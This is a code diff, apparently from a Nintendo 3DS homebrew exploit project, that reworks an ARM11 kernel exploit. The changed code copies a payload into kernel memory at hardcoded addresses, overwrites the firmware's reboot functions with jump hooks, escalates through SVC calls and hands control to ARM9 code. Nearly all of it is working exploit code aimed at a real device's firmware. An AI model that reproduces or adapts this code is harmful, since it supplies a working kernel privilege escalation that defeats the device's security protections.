@@ -6,6 +6,7 @@
 #include <string.h>
 #include <malloc.h>
 #include <dirent.h>
+#include "arm11.h"
 
 static u32 nopSlide[0x1000] __attribute__((aligned(0x1000)));
 static const size_t bufSize = 0x10000;
@@ -134,7 +135,7 @@ static inline void InvalidateAllIcache()
 		::: "r0");
 }
 
-static int arm11_kernel_exploit_setup()
+static int arm11Kxploit()
 {
 	const size_t allocSize = 0x2000;
 	const size_t freeOffset = 0x1000;
@@ -206,46 +207,51 @@ static int arm11_kernel_exploit_setup()
 	return 0;
 }
 
-void doArm9Hax()
+static void doArm9Hax()
 {
 	int (* const reboot)(int, int, int, int) = (void *)0xFFF748C4;
+	const int32_t j = 0xE51FF004; // ldr pc, [pc, #4]
+	int32_t *src, *dst;
 
 #ifdef DEBUG_PROCESS
-	printf("Setting up Arm9\n");
+	puts("Hooking Reboot Fuctions");
 #endif
 	__asm__ ("clrex");
-
-	CleanAllDcache();
-	InvalidateAllIcache();
 
 	// ARM9 code copied to FCRAM 0x23F00000
 	//memcpy(0xF3F00000, ARM9_PAYLOAD, ARM9_PAYLOAD_LEN);
 	// Write function hook at 0xFFFF0C80
-	//memcpy(0xEFFF4C80, 0x9D23AC, 0x9D2580);
+	dst = (int32_t *)0xEFFF4C80;
+	for (src = arm11PayloadTop; src != arm11PayloadBtm; src++) {
+		*dst = *src;
+		dst++;
+	}
 
 	// Write FW specific offsets to copied code buffer
 	*(int32_t *)(0xEFFF4C80 + 0x60) = 0xFFFD0000; // PDN regs
 	*(int32_t *)(0xEFFF4C80 + 0x64) = 0xFFFD2000; // PXI regs
 	*(int32_t *)(0xEFFF4C80 + 0x68) = 0xFFF84DDC; // where to return to from hook
 
-	// Patch function 0xFFF84D90 to jump to our hook
-	*(int32_t *)(0xFFF84DD4 + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
-	*(int32_t *)(0xFFF84DD4 + 4) = 0xFFFF0C80; // jump_table + 0
-	// Patch reboot start function to jump to our hook
-	*(int32_t *)(0xFFFF097C + 0) = 0xE51FF004; // ldr pc, [pc, #-4]
-	*(int32_t *)(0xFFFF097C + 4) = 0x1FFF4C84; // jump_table + 4
+	*(int32_t *)0xEFFE4DD4 = j;
+	*(int32_t *)0xEFFE4DD8 = 0xFFFF0C80; // arm11Payload
 
+	*(int32_t *)0xEFFF497C = j;
+	*(int32_t *)0xEFFF4980 = 0x1FFF4C84; // arm11Payload + 4
+
+	CleanAllDcache();
 	InvalidateAllIcache();
 
 	reboot(0, 0, 2, 0);
 }
 
+#ifdef DEBUG_PROCESS
 static void test()
 {
 	buf[0] = 0xFEEFF00F;
 }
+#endif
 
-static void __attribute__((naked)) arm11_kernel_exec()
+static void __attribute__((naked)) arm11Kexec()
 {
 	const int32_t nop = 0xE320F000;
 
@@ -265,11 +271,13 @@ static void __attribute__((naked)) arm11_kernel_exec()
 	InvalidateAllIcache();
 	CleanAllDcache();
 
+	doArm9Hax();
+
 	__asm__("movs r0, #0\n"
 		 "pop {pc}\n");
 }
 
-int doARM11Hax()
+int doKernelHax()
 {
 	u32 result;
 	int i;
@@ -297,7 +305,7 @@ int doARM11Hax()
 	for (i = 0; i < sizeof(nopSlide) / sizeof(int32_t); i++)
 		buf[i] = 0xDEADBEEF;
 
-	i = arm11_kernel_exploit_setup();
+	i = arm11Kxploit();
 	if (i)
 		return i;
 
@@ -306,22 +314,15 @@ int doARM11Hax()
 #endif
 	__asm__("ldr r0, =%0\n"
 		"svc #8\n"
-		:: "i"(arm11_kernel_exec) : "r0");
-	//if (svcIsPatched)
-	{
+		:: "i"(arm11Kexec) : "r0");
 #ifdef DEBUG_PROCESS
+	if (svcIsPatched) {
 		printf("Testing SVC 0x7B\n");
-#endif
 		__asm__("ldr r0, =%0\n"
 			"svc #0x7B\n"
 			:: "i"(test) : "r0");
-
-		doArm9Hax();
-
-#ifdef DEBUG_PROCESS
-		printf("Arm9 setup\n");
-#endif
 	}
+#endif
 
 	return !svcIsPatched;
 }
